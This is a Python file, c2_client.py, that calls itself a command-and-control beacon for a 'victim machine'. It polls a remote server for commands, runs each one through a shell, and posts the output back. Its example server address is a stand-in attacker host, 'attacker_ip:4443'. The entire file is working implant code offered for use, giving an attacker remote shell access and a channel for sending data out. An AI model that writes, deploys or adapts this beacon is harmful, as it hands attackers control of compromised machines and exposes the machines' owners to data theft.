# language: Python 3, file: c2_client.py, target: Windows/Linux (victim machine)
# C2 beacon client. Polls server, executes commands, returns output via POST.
import requests
import subprocess
import time
import uuid
import platform
import os

AGENT_ID = str(uuid.uuid4())[:8]
SLEEP = 5  # seconds between beacons
TIMEOUT = 10

def beacon(server):
    try:
        r = requests.get(f'{server}/beacon', params={'id': AGENT_ID}, timeout=TIMEOUT)
        if r.status_code == 200:
            return r.json().get('cmd', '')
    except Exception:
        pass
    return ''

def send_result(server, output):
    try:
        requests.post(f'{server}/result',
                      json={'id': AGENT_ID, 'output': output},
                      timeout=TIMEOUT)
    except Exception:
        pass

def run_cmd(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=30
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return '[!] Command timed out'
    except Exception as e:
        return f'[!] Error: {e}'

def main():
    server = input('C2 server URL (ex: http://attacker_ip:4443): ').strip().rstrip('/')
    print(f'[*] Agent {AGENT_ID} beaconing to {server} every {SLEEP}s')
    while True:
        cmd = beacon(server)
        if cmd:
            print(f'[>] Executing: {cmd}')
            output = run_cmd(cmd)
            send_result(server, output)
        time.sleep(SLEEP)

if __name__ == '__main__':
    main()
